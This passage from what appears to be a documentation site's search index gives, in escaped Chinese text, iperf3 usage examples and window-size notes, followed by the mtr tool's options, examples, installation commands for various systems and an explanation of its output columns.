\u4f7f\u7528\u201c\u96f6\u62f7\u8d1d\u201d\u65b9\u6cd5\u53d1\u9001\u6570\u636e -O\uff0c--omit N \u7701\u7565\u524dn\u79d2 -T\uff0c--title str \u6bcf\u4e2a\u8f93\u51fa\u884c\u90fd\u4ee5\u6b64\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00 --get-server-output \u4ece\u670d\u52a1\u5668\u83b7\u53d6\u7ed3\u679c --udp-counters-64bit \u5728UDP\u6d4b\u8bd5\u6570\u636e\u5305\u4e2d\u4f7f\u752864\u4f4d\u8ba1\u6570\u5668 [KMG]\u8868\u793a\u652f\u6301kilo\uff08\u5343\u4f4d\uff09\uff0cmega\uff08\u5146\u4f4d\uff09\u6216giga\uff08\u5409\u4f4d\uff09\u7684\u9009\u9879\u540e\u7f00 iperf3\u4e3b\u9875\uff1ahttp://software.es.net/iperf/ \u62a5\u544a\u9519\u8bef\uff1ahttps://github.com/esnet/iperf \u5f53\u4f7f\u7528iperf3\u8fdb\u884c\u7f51\u7edc\u6027\u80fd\u6d4b\u8bd5\u65f6\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u7528\u6cd5\u793a\u4f8b\uff1a \u5728\u670d\u52a1\u5668\u6a21\u5f0f\u4e0b\u8fd0\u884ciperf3\uff1a iperf3 -s \u8fd9\u5c06\u5728\u9ed8\u8ba4\u7aef\u53e3\uff085201\uff09\u4e0a\u542f\u52a8iperf3\u670d\u52a1\u5668\u4ee5\u76d1\u542c\u8fde\u63a5\u8bf7\u6c42\u3002 \u5728\u5ba2\u6237\u7aef\u6a21\u5f0f\u4e0b\u8fde\u63a5\u5230iperf3\u670d\u52a1\u5668\uff0c\u8fdb\u884c\u4e0b\u8f7d\u6d4b\u8bd5\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -R \u7528\u670d\u52a1\u5668\u7684\u5b9e\u9645IP\u5730\u5740\u66ff\u6362\u201c\u670d\u52a1\u5668IP\u5730\u5740\u201d\u4ee5\u8fde\u63a5\u5230\u670d\u52a1\u5668\u5e76\u6d4b\u8bd5\u5e26\u5bbd\u3002 iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -R -P 10 \u5f0010\u4e2a\u5e76\u53d1\uff0c\u540c\u65f6\u8fdb\u884c\u4e0b\u8f7d\u6d4b\u8bd5 iperf3 -c -w 1024K \u670d\u52a1\u5668IP\u5730\u5740 -R -P 10 \u8bbe\u7f6etcp\u7a97\u53e3\u4e3a1024K\uff0c\u5f0010\u4e2a\u5e76\u53d1\uff0c\u540c\u65f6\u8fdb\u884c\u4e0b\u8f7d\u6d4b\u8bd5 \u4f7f\u7528UDP\u534f\u8bae\u8fdb\u884c\u6d4b\u8bd5\uff1a iperf3 -u -c \u670d\u52a1\u5668IP\u5730\u5740 \u8fd9\u5c06\u4f7f\u7528UDP\u534f\u8bae\u800c\u4e0d\u662f\u9ed8\u8ba4\u7684TCP\u534f\u8bae\u8fdb\u884c\u5e26\u5bbd\u6d4b\u8bd5\u3002 \u8bbe\u7f6e\u6d4b\u8bd5\u65f6\u957f\uff1a iperf3 -t 30 -c \u670d\u52a1\u5668IP\u5730\u5740 \u8fd9\u5c06\u4f7fiperf3\u6d4b\u8bd5\u8fd0\u884c30\u79d2\uff0c\u7136\u540e\u751f\u6210\u5e26\u5bbd\u62a5\u544a\u3002 \u8bbe\u7f6e\u5e26\u5bbd\u9650\u5236\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -b 10M \u8fd9\u5c06\u9650\u5236\u6d4b\u8bd5\u7684\u5e26\u5bbd\u4e3a10\u5146\u4f4d\u6bcf\u79d2\uff08Mbps\uff09\u3002 \u5e76\u884c\u8fde\u63a5\u6d4b\u8bd5\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -P 4 \u8fd9\u5c06\u521b\u5efa4\u4e2a\u5e76\u884c\u8fde\u63a5\u4ee5\u540c\u65f6\u6d4b\u8bd5\u5e26\u5bbd\u3002 \u8f93\u51faJSON\u683c\u5f0f\u62a5\u544a\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -J \u8fd9\u5c06\u751f\u6210\u4e00\u4e2a\u4ee5JSON\u683c\u5f0f\u5448\u73b0\u7684\u5e26\u5bbd\u62a5\u544a\u3002 \u8fd9\u4e9b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684iperf3\u7528\u6cd5\u793a\u4f8b\uff0c\u60a8\u53ef\u4ee5\u6839\u636e\u7279\u5b9a\u7684\u7f51\u7edc\u6d4b\u8bd5\u9700\u6c42\u8fdb\u884c\u8c03\u6574\u548c\u6269\u5c55\u3002 -w \u53c2\u6570\u7528\u4e8e\u8bbe\u7f6eiperf3 \u6d4b\u8bd5\u4e2d\u7684\u7a97\u53e3\u5927\u5c0f\uff08\u6216\u5957\u63a5\u5b57\u7f13\u51b2\u533a\u5927\u5c0f\uff09\u3002\u7a97\u53e3\u5927\u5c0f\u5728TCP\u6d4b\u8bd5\u4e2d\u7279\u522b\u91cd\u8981\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u5f71\u54cd\u6570\u636e\u4f20\u8f93\u901f\u5ea6\u548c\u6027\u80fd\u3002\u4e0b\u9762\u662f -w \u53c2\u6570\u7684\u7528\u6cd5\u793a\u4f8b\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -w 64K \u5728\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c -w \u540e\u9762\u8ddf\u7740\u7a97\u53e3\u5927\u5c0f\u7684\u8bbe\u7f6e\uff0c\u8fd9\u91cc\u8bbe\u7f6e\u7a97\u53e3\u5927\u5c0f\u4e3a 64K\uff0864\u5343\u5b57\u8282\uff09\u3002\u60a8\u53ef\u4ee5\u6839\u636e\u9700\u6c42\u8c03\u6574\u7a97\u53e3\u5927\u5c0f\u7684\u503c\uff0c\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528 K\u3001M \u6216 G \u4f5c\u4e3a\u540e\u7f00\uff0c\u8868\u793a\u5343\u5b57\u8282\u3001\u5146\u5b57\u8282\u6216\u5343\u5146\u5b57\u8282\u3002 \u7a97\u53e3\u5927\u5c0f\u7684\u9009\u62e9\u53d6\u51b3\u4e8e\u7f51\u7edc\u73af\u5883\u548c\u6d4b\u8bd5\u76ee\u6807\u3002\u8f83\u5927\u7684\u7a97\u53e3\u5927\u5c0f\u53ef\u80fd\u4f1a\u63d0\u9ad8\u5e26\u5bbd\u5229\u7528\u7387\uff0c\u4f46\u53ef\u80fd\u4f1a\u589e\u52a0\u5ef6\u8fdf\u3002\u8f83\u5c0f\u7684\u7a97\u53e3\u5927\u5c0f\u53ef\u80fd\u4f1a\u51cf\u5c11\u5ef6\u8fdf\uff0c\u4f46\u53ef\u80fd\u65e0\u6cd5\u5145\u5206\u5229\u7528\u9ad8\u5e26\u5bbd\u8fde\u63a5\u3002\u56e0\u6b64\uff0c\u60a8\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u6d4b\u8bd5\u548c\u8c03\u6574\uff0c\u4ee5\u627e\u5230\u6700\u4f73\u7684\u7a97\u53e3\u5927\u5c0f\u8bbe\u7f6e\u3002","title":"iperf3\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/mtr%E5%B7%A5%E5%85%B7/","text":"mtr\u5de5\u5177 MAN\u624b\u518c \u540d\u79f0 mtr \uff08My Traceroute\uff09\u662f\u4e00\u4e2a\u7f51\u7edc\u8bca\u65ad\u5de5\u5177\uff0c\u7ed3\u5408\u4e86 traceroute \u548c ping \u547d\u4ee4\u7684\u529f\u80fd\u3002\u5b83\u7528\u4e8e\u663e\u793a\u5230\u76ee\u6807\u670d\u52a1\u5668\u7684\u8def\u7531\u8def\u5f84\uff0c\u5e76\u8fde\u7eed\u6d4b\u8bd5\u548c\u62a5\u544a\u6bcf\u4e2a\u8def\u7531\u8df3\u70b9\uff08hop\uff09\u7684\u7f51\u7edc\u8d28\u91cf\u3002 mtr \u63d0\u4f9b\u4e86\u5173\u4e8e\u7f51\u7edc\u8fde\u63a5\u7684\u5b9e\u65f6\u6570\u636e\uff0c\u5305\u62ec\u8def\u7531\u8def\u5f84\u3001\u4f20\u8f93\u5ef6\u8fdf\u548c\u4e22\u5305\u7b49\u4fe1\u606f\u3002 \u6982\u8ff0 mtr [-BfhvrctglxspQemniuTP46] [--help] [--version] [--report] [--report-wide] [--report-cycles COUNT] [--curses] [--split] [--raw] [--xml] [--mpls] [--no-dns] [--show-ips] [--gtk] [--address IP.ADD.RE.SS] [--interval SECONDS] [--max-ttl NUM] [--first-ttl NUM] [--bitpattern NUM] [--tos NUM] [--psize BYTES | -s BYTES] [--tcp] [--udp] [--port PORT] [--timeout SECONDS] HOSTNAME [PACKETSIZE] \u63cf\u8ff0 mtr \u7ed3\u5408\u4e86 traceroute \u548c ping \u7a0b\u5e8f\u7684\u529f\u80fd\uff0c\u6210\u4e3a\u4e00\u4e2a\u5355\u4e00\u7684\u7f51\u7edc\u8bca\u65ad\u5de5\u5177\u3002\u5f53 mtr \u542f\u52a8\u65f6\uff0c\u5b83\u4f1a\u68c0\u67e5\u8fd0\u884c mtr \u7684\u4e3b\u673a\u4e0e HOSTNAME \u4e4b\u95f4\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u901a\u8fc7\u53d1\u9001\u5177\u6709\u7279\u610f\u8bbe\u5b9a\u7684\u4f4e TTL \u7684\u6570\u636e\u5305\u3002\u5b83\u7ee7\u7eed\u53d1\u9001\u4f4e TTL \u7684\u6570\u636e\u5305\uff0c\u6ce8\u610f\u4e2d\u95f4\u8def\u7531\u5668\u7684\u54cd\u5e94\u65f6\u95f4\u3002\u8fd9\u4f7f mtr \u80fd\u591f\u6253\u5370\u5230 HOSTNAME \u7684\u7f51\u7edc\u8def\u5f84\u7684\u54cd\u5e94\u767e\u5206\u6bd4\u548c\u54cd\u5e94\u65f6\u95f4\u3002\u7a81\u7136\u7684\u6570\u636e\u5305\u4e22\u5931\u6216\u54cd\u5e94\u65f6\u95f4\u7684\u589e\u52a0\u901a\u5e38\u8868\u793a\u4e00\u4e2a\u4e0d\u597d\u7684\uff08\u6216\u7b80\u5355\u7684\u8d85\u8f7d\u7684\uff09\u94fe\u63a5\u3002\u7ed3\u679c\u901a\u5e38\u4ee5\u6beb\u79d2\u7684\u5f80\u8fd4\u54cd\u5e94\u65f6\u95f4\u548c\u4e22\u5305\u767e\u5206\u6bd4\u62a5\u544a\u3002 \u9009\u9879 -h --help \u8f93\u51fa\u547d\u4ee4\u884c\u53c2\u6570\u9009\u9879\u7684\u6458\u8981\u3002 -v --version \u6253\u5370 mtr \u7684\u5df2\u5b89\u88c5\u7248\u672c\u3002 -r --report \u6b64\u9009\u9879\u4f7f mtr \u8fdb\u5165\u62a5\u544a\u6a21\u5f0f\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\uff0cmtr \u5c06\u8fd0\u884c\u7531 -c \u9009\u9879\u6307\u5b9a\u7684\u5faa\u73af\u6b21\u6570\uff0c\u7136\u540e\u6253\u5370\u7edf\u8ba1\u4fe1\u606f\u5e76\u9000\u51fa\u3002\u8fd9\u79cd\u6a21\u5f0f\u5bf9\u4e8e\u751f\u6210\u5173\u4e8e\u7f51\u7edc\u8d28\u91cf\u7684\u7edf\u8ba1\u6570\u636e\u975e\u5e38\u6709\u7528\u3002\u8bf7\u6ce8\u610f\uff0c\u6bcf\u4e2a\u8fd0\u884c\u7684 mtr \u5b9e\u4f8b\u90fd\u4f1a\u751f\u6210\u5927\u91cf\u7684\u7f51\u7edc\u6d41\u91cf\u3002\u4f7f\u7528 mtr \u6765\u6d4b\u91cf\u7f51\u7edc\u7684\u8d28\u91cf\u53ef\u80fd\u5bfc\u81f4\u7f51\u7edc\u6027\u80fd\u4e0b\u964d\u3002 -w --report-wide \u6b64\u9009\u9879\u4f7f mtr \u8fdb\u5165\u5bbd\u62a5\u544a\u6a21\u5f0f\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\uff0cmtr \u5728\u62a5\u544a\u4e2d\u4e0d\u4f1a\u622a\u65ad\u4e3b\u673a\u540d\u3002 -c COUNT --report-cycles COUNT \u4f7f\u7528\u6b64\u9009\u9879\u8bbe\u7f6e\u53d1\u9001\u7684 ping \u6570\u91cf\uff0c\u4ee5\u786e\u5b9a\u7f51\u7edc\u4e0a\u7684\u673a\u5668\u53ca\u5176\u53ef\u9760\u6027\u3002\u6bcf\u4e2a\u5faa\u73af\u6301\u7eed\u4e00\u79d2\u3002 -s BYTES --psize BYTES PACKETSIZE \u8fd9\u4e9b\u9009\u9879\u6216\u547d\u4ee4\u884c\u672b\u5c3e\u7684 PACKETSIZE \u7528\u4e8e\u8bbe\u7f6e\u7528\u4e8e\u63a2\u6d4b\u7684\u6570\u636e\u5305\u5927\u5c0f\u3002\u5b83\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff0c\u5305\u62ec IP \u548c ICMP \u5934\u90e8\u3002\u5982\u679c\u8bbe\u7f6e\u4e3a\u8d1f\u6570\uff0c\u6bcf\u6b21\u8fed\u4ee3\u90fd\u4f1a\u4f7f\u7528\u4e0d\u540c\u7684\u968f\u673a\u6570\u636e\u5305\u5927\u5c0f\uff0c\u6700\u5927\u4e0d\u8d85\u8fc7\u8be5\u6570\u5b57\u3002 -t --curses \u4f7f\u7528\u6b64\u9009\u9879\u5f3a\u5236 mtr \u4f7f\u7528\u57fa\u4e8e curses \u7684\u7ec8\u7aef\u754c\u9762\uff08\u5982\u679c\u53ef\u7528\uff09\u3002 -e --mpls \u4f7f\u7528\u6b64\u9009\u9879\u544a\u8bc9 mtr \u663e\u793a\u6765\u81ea ICMP \u6269\u5c55\u7684 MPLS (RFC 4950) \u4fe1\u606f\uff0c\u8be5\u4fe1\u606f\u88ab\u7f16\u7801\u5728\u54cd\u5e94\u6570\u636e\u5305\u4e2d\u3002 -n --no-dns \u4f7f\u7528\u6b64\u9009\u9879\u5f3a\u5236 mtr \u663e\u793a\u6570\u5b57 IP \u5730\u5740\uff0c\u4e0d\u5c1d\u8bd5\u89e3\u6790\u4e3b\u673a\u540d\u3002 -b --show-ips \u4f7f\u7528\u6b64\u9009\u9879\u544a\u8bc9 mtr \u540c\u65f6\u663e\u793a\u4e3b\u673a\u540d\u548c\u6570\u5b57 IP \u5730\u5740\u3002\u5728\u5206\u88c2\u6a21\u5f0f\u4e0b\uff0c\u8fd9\u4f1a\u5728\u8f93\u51fa\u4e2d\u589e\u52a0\u4e00\u4e2a\u989d\u5916\u7684\u5b57\u6bb5\u3002\u5728\u62a5\u544a\u6a21\u5f0f\u4e2d\uff0c\u901a\u5e38\u6ca1\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u6dfb\u52a0 IP\uff0c\u5b83\u4eec\u5c06\u88ab\u622a\u65ad\u3002\u4f7f\u7528\u5bbd\u62a5\u544a (-w) \u6a21\u5f0f\u5728\u62a5\u544a\u6a21\u5f0f\u4e2d\u67e5\u770b IP\u3002 -o fields order --order fields order \u4f7f\u7528\u6b64\u9009\u9879\u5728\u52a0\u8f7d mtr \u65f6\u6307\u5b9a\u5b57\u6bb5\u53ca\u5176\u987a\u5e8f\u3002 \u53ef\u7528\u5b57\u6bb5\uff1a \u6807\u8bc6 \u63cf\u8ff0 L \u4e22\u5305\u6bd4\u4f8b D \u4e22\u5931\u7684\u6570\u636e\u5305 R \u63a5\u6536\u7684\u6570\u636e\u5305 S \u5df2\u53d1\u9001\u7684\u6570\u636e\u5305 N \u6700\u65b0\u7684 RTT(\u6beb\u79d2) B \u6700\u5c0f/\u6700\u597d\u7684 RTT(\u6beb\u79d2) A \u5e73\u5747 RTT(\u6beb\u79d2) W \u6700\u5927/\u6700\u5dee\u7684 RTT(\u6beb\u79d2) V \u6807\u51c6\u504f\u5dee G \u51e0\u4f55\u5747\u503c J \u5f53\u524d\u6296\u52a8 M \u6296\u52a8\u5747\u503c X \u6700\u5dee\u6296\u52a8 I \u5230\u8fbe\u95f4\u9694\u6296\u52a8 \u793a\u4f8b\uff1a-o \"LSD NBAW\" -g --gtk \u4f7f\u7528\u6b64\u9009\u9879\u5f3a\u5236 mtr \u4f7f\u7528\u57fa\u4e8e GTK+ \u7684 X11 \u7a97\u53e3\u754c\u9762\uff08\u5982\u679c\u53ef\u7528\uff09\u3002\u5f53 mtr \u6784\u5efa\u65f6\u7cfb\u7edf\u4e0a\u5fc5\u987b\u6709 GTK+ \u624d\u80fd\u4f7f\u5176\u5de5\u4f5c\u3002\u66f4\u591a\u5173\u4e8e GTK+ \u7684\u4fe1\u606f\uff0c\u8bf7\u8bbf\u95ee http://www.gtk.org/ \u3002 -p --split \u4f7f\u7528\u6b64\u9009\u9879\u8bbe\u7f6e mtr \u4ee5\u8f93\u51fa\u9002\u5408\u4e8e\u5206\u88c2\u7528\u6237\u754c\u9762\u7684\u683c\u5f0f\u3002 -l --raw \u4f7f\u7528\u6b64\u9009\u9879\u544a\u8bc9 mtr \u4f7f\u7528\u539f\u59cb\u8f93\u51fa\u683c\u5f0f\u3002\u6b64\u683c\u5f0f\u66f4\u9002\u5408\u6d4b\u91cf\u7ed3\u679c\u7684\u5b58\u6863\u3002\u5b83\u53ef\u4ee5\u88ab\u89e3\u6790\u4ee5\u5448\u73b0\u5230\u4efb\u4f55\u5176\u4ed6\u663e\u793a\u65b9\u6cd5\u3002 -x --xml \u4f7f\u7528\u6b64\u9009\u9879\u544a\u8bc9 mtr \u4f7f\u7528 xml \u8f93\u51fa\u683c\u5f0f\u3002\u6b64\u683c\u5f0f\u66f4\u9002\u5408\u4e8e\u6d4b\u91cf\u7ed3\u679c\u7684\u81ea\u52a8\u5904\u7406\u3002 -a IP.ADD.RE.SS --address IP.ADD.RE.SS \u4f7f\u7528\u6b64\u9009\u9879\u5c06\u53d1\u51fa\u7684\u6570\u636e\u5305\u7684\u5957\u63a5\u5b57\u7ed1\u5b9a\u5230\u7279\u5b9a\u63a5\u53e3\uff0c\u8fd9\u6837\u4efb\u4f55\u6570\u636e\u5305\u90fd\u4f1a\u901a\u8fc7\u6b64\u63a5\u53e3\u53d1\u9001\u3002\u8bf7\u6ce8\u610f\uff0c\u6b64\u9009\u9879\u4e0d\u9002\u7528\u4e8e DNS \u8bf7\u6c42\u3002 -i SECONDS --interval SECONDS \u4f7f\u7528\u6b64\u9009\u9879\u6307\u5b9a ICMP ECHO \u8bf7\u6c42\u4e4b\u95f4\u7684\u6b63\u6570\u79d2\u6570\u3002\u6b64\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u662f\u4e00\u79d2\u3002 -m NUM --max-ttl NUM \u6307\u5b9a traceroute \u5c06\u63a2\u6d4b\u7684\u6700\u5927\u8df3\u6570\uff08\u6700\u5927\u751f\u5b58\u65f6\u95f4\u503c\uff09\u3002\u9ed8\u8ba4\u662f30\u3002 -f NUM --first-ttl NUM \u6307\u5b9a\u4ece\u54ea\u4e2a TTL \u5f00\u59cb\u3002\u9ed8\u8ba4\u503c\u4e3a1\u3002 -B NUM --bitpattern NUM \u6307\u5b9a\u5728\u8d1f\u8f7d\u4e2d\u4f7f\u7528\u7684\u4f4d\u6a21\u5f0f\u3002\u5e94\u57280 - 255\u8303\u56f4\u5185\u3002 -Q NUM --tos NUM \u6307\u5b9a IP \u6807\u5934\u4e2d\u670d\u52a1\u7c7b\u578b\u5b57\u6bb5\u7684\u503c\u3002\u5e94\u57280 - 255\u8303\u56f4\u5185\u3002 -u --udp \u4f7f\u7528 UDP \u6570\u636e\u62a5\u800c\u4e0d\u662f ICMP ECHO\u3002 -T --tcp \u4f7f\u7528 TCP SYN \u6570\u636e\u5305\u800c\u4e0d\u662f ICMP ECHO\u3002PACKETSIZE \u88ab\u5ffd\u7565\uff0c\u56e0\u4e3a SYN \u6570\u636e\u5305\u4e0d\u80fd\u5305\u542b\u6570\u636e\u3002 -P PORT --port PORT TCP \u8ddf\u8e2a\u7684\u76ee\u6807\u7aef\u53e3\u53f7\u3002 --timeout SECONDS \u5728\u653e\u5f03\u8fde\u63a5\u4e4b\u524d\u4fdd\u6301 TCP \u5957\u63a5\u5b57\u6253\u5f00\u7684\u79d2\u6570\u3002\u8fd9\u53ea\u4f1a\u5f71\u54cd\u6700\u540e\u4e00\u8df3\u3002\u5bf9\u6b64\u4f7f\u7528\u5927\u7684\u503c\uff0c\u7279\u522b\u662f\u4e0e\u77ed\u95f4\u9694\u7ed3\u5408\u4f7f\u7528\uff0c\u5c06\u4f7f\u7528\u5927\u91cf\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002 -4 \u4ec5\u4f7f\u7528 IPv4\u3002 -6 \u4ec5\u4f7f\u7528 IPv6\u3002 \u95ee\u9898 \u4e00\u4e9b\u73b0\u4ee3\u8def\u7531\u5668\u6bd4\u5176\u4ed6\u7f51\u7edc\u6d41\u91cf\u5bf9 ICMP ECHO \u6570\u636e\u5305\u7684\u4f18\u5148\u7ea7\u8f83\u4f4e\u3002\u56e0\u6b64\uff0cmtr \u62a5\u544a\u7684\u8fd9\u4e9b\u8def\u7531\u5668\u7684\u53ef\u9760\u6027\u5c06\u6bd4\u8fd9\u4e9b\u8def\u7531\u5668\u7684\u5b9e\u9645\u53ef\u9760\u6027\u663e\u8457\u964d\u4f4e\u3002 \u8054\u7cfb\u4fe1\u606f \u8981\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff0c\u8bf7\u8bbf\u95ee mtr \u7f51\u9875\uff1ahttp://www.bitwizard.nl/mtr/\u3002 \u4ee5\u4e0b\u662f\u4e00\u4e9b mtr \u7684\u5e38\u7528\u5b9e\u4f8b \u57fa\u672c\u4f7f\u7528 : mtr example.com \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u542f\u52a8\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684 mtr \u4f1a\u8bdd\uff0c\u6301\u7eed\u5730\u76d1\u63a7\u4ece\u5f53\u524d\u7cfb\u7edf\u5230 example.com \u7684\u8def\u5f84\u3002 \u4ec5\u4f7f\u7528IPv4 : mtr -4 example.com \u8fd9\u5c06\u4ec5\u4f7f\u7528IPv4\u8fdb\u884c\u8ffd\u8e2a\u3002 \u4ec5\u4f7f\u7528IPv6 : mtr -6 example.com \u8fd9\u5c06\u4ec5\u4f7f\u7528IPv6\u8fdb\u884c\u8ffd\u8e2a\u3002 \u663e\u793a\u62a5\u544a : mtr -r -c 10 example.com \u8fd9\u5c06\u53d1\u900110\u4e2a\u6570\u636e\u5305\u5230 example.com \uff0c\u7136\u540e\u663e\u793a\u7edf\u8ba1\u62a5\u544a\u5e76\u9000\u51fa\u3002 \u663e\u793a\u5bbd\u62a5\u544a : mtr -rw example.com \u4e0e\u4e0a\u9762\u7684\u62a5\u544a\u6a21\u5f0f\u76f8\u4f3c\uff0c\u4f46\u4f1a\u4f7f\u7528\u5bbd\u683c\u5f0f\u4ee5\u907f\u514d\u4e3b\u673a\u540d\u88ab\u622a\u65ad\u3002 \u4e0d\u89e3\u6790DNS : mtr -n example.com \u8fd9\u5c06\u663e\u793a\u6570\u5b57IP\u5730\u5740\uff0c\u800c\u4e0d\u662f\u5c1d\u8bd5\u89e3\u6790\u4e3b\u673a\u540d\u3002 \u4f7f\u7528UDP\u6570\u636e\u62a5 : mtr -u example.com \u4f7f\u7528TCP SYN\u6570\u636e\u5305 : mtr -T example.com \u6307\u5b9a\u6570\u636e\u5305\u5927\u5c0f : mtr -s 100 example.com \u8fd9\u5c06\u4f7f\u7528100\u5b57\u8282\u7684\u6570\u636e\u5305\u8fdb\u884c\u8ffd\u8e2a\u3002 \u6307\u5b9a\u65f6\u95f4\u95f4\u9694 : mtr -i 2 example.com \u8fd9\u5c06\u6bcf2\u79d2\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5305\u3002 \u8fd9\u53ea\u662f mtr \u7684\u4e00\u4e9b\u57fa\u672c\u4f7f\u7528\u5b9e\u4f8b\u3002\u7531\u4e8e mtr \u662f\u4e00\u4e2a\u529f\u80fd\u4e30\u5bcc\u7684\u5de5\u5177\uff0c\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u9009\u9879\u548c\u914d\u7f6e\u53ef\u7528\u3002\u4e3a\u4e86\u66f4\u5168\u9762\u5730\u4e86\u89e3\u8fd9\u4e9b\u529f\u80fd\uff0c\u5efa\u8bae\u67e5\u770b\u5176\u5b98\u65b9\u6587\u6863\u6216\u4f7f\u7528 man mtr \u547d\u4ee4\u3002 \u5404\u4e2a\u7cfb\u7edf\u5b89\u88c5\u65b9\u5f0f Debian/Ubuntu : \u4f7f\u7528apt\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\uff1a sudo apt update sudo apt install mtr Fedora : \u4f7f\u7528dnf\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\uff1a sudo dnf install mtr CentOS/RHEL : \u9996\u5148\uff0c\u786e\u4fdd\u542f\u7528\u4e86EPEL\u4ed3\u5e93\uff0c\u7136\u540e\u4f7f\u7528yum\u8fdb\u884c\u5b89\u88c5\uff1a sudo yum install epel-release sudo yum install mtr openSUSE : \u4f7f\u7528zypper\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\uff1a sudo zypper install mtr Arch Linux/Manjaro : \u4f7f\u7528pacman\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\uff1a sudo pacman -S mtr FreeBSD : \u4f7f\u7528pkg\u5305\u7ba1\u7406\u5668\u6216ports\u96c6\u5408\u8fdb\u884c\u5b89\u88c5\uff1a sudo pkg install mtr \u6216 cd /usr/ports/net/mtr/ && make install clean macOS : \u5982\u679c\u5df2\u7ecf\u5b89\u88c5\u4e86Homebrew\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5\uff1a brew install mtr Windows : Windows\u4e0a\u6ca1\u6709\u539f\u751f\u7684 mtr \u5de5\u5177\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177\u5982 WinMTR \uff0c\u8fd9\u662f\u4e00\u4e2a mtr \u7684Windows\u56fe\u5f62\u7248\u672c\u3002\u53ef\u4ee5\u4ece\u5176\u5b98\u65b9\u7f51\u7ad9\u4e0b\u8f7d\u5b89\u88c5\u5305\u5e76\u8fdb\u884c\u5b89\u88c5\u3002 \u5bf9\u4e8e\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u6216\u53d1\u884c\u7248\uff0c\u5efa\u8bae\u67e5\u770b\u5176\u5b98\u65b9\u6587\u6863\u6216\u8f6f\u4ef6\u4ed3\u5e93\u4ee5\u83b7\u53d6\u6709\u5173\u5982\u4f55\u5b89\u88c5 mtr \u7684\u6307\u5357\u3002 \u662f mtr \u8f93\u51fa\u7ed3\u679c\u7684\u89e3\u91ca\uff1a mtr \u8f93\u51fa\u7ed3\u679c\u89e3\u91ca mtr\u7ed3\u5408\u4e86traceroute\u548cping\u7684\u529f\u80fd\uff0c\u5b83\u663e\u793a\u4e86\u4ece\u6e90\u8ba1\u7b97\u673a\u5230\u76ee\u6807\u4e3b\u673a\u7684\u8def\u5f84\uff0c\u5e76\u63d0\u4f9b\u4e86\u6bcf\u4e2a\u8dc3\u70b9\u7684\u7edf\u8ba1\u4fe1\u606f\u3002\u4ee5\u4e0b\u662f\u8f93\u51fa\u5217\u7684\u542b\u4e49\uff1a HOP \uff1a - \u8868\u793a\u6570\u636e\u5305\u9700\u8981\u7ecf\u8fc7\u7684\u8dc3\u70b9\u6216\u8def\u7531\u5668\u6570\u91cf\uff0c\u4ece\u6e90\u8ba1\u7b97\u673a\u5f00\u59cb\u3002 Host \uff1a - \u8fd9\u4e00\u5217\u663e\u793a\u4e86\u6bcf\u4e2a\u8dc3\u70b9\u7684\u57df\u540d\u6216IP\u5730\u5740\u3002 Loss% \uff1a - \u663e\u793a\u4e86\u4e22\u5931\u7684\u6570\u636e\u5305\u767e\u5206\u6bd4\u3002 Snt \uff1a - \u53d1\u9001\u7684\u6570\u636e\u5305\u603b\u6570\u3002 Last \uff1a - \u6700\u540e\u4e00\u4e2a\u6570\u636e\u5305\u7684\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002 Avg \uff1a - \u6240\u6709\u6570\u636e\u5305\u7684\u5e73\u5747\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002 Best \uff1a - \u6240\u6709\u6570\u636e\u5305\u4e2d\u7684\u6700\u77ed\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002 Wrst \uff1a - \u6240\u6709\u6570\u636e\u5305\u4e2d\u7684\u6700\u957f\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002 StDev \uff1a \u5f80\u8fd4\u65f6\u95f4\u7684\u6807\u51c6\u504f\u5dee\uff0c\u8868\u793a\u5f80\u8fd4\u65f6\u95f4\u7684\u53d8\u5316\u7a0b\u5ea6\u3002 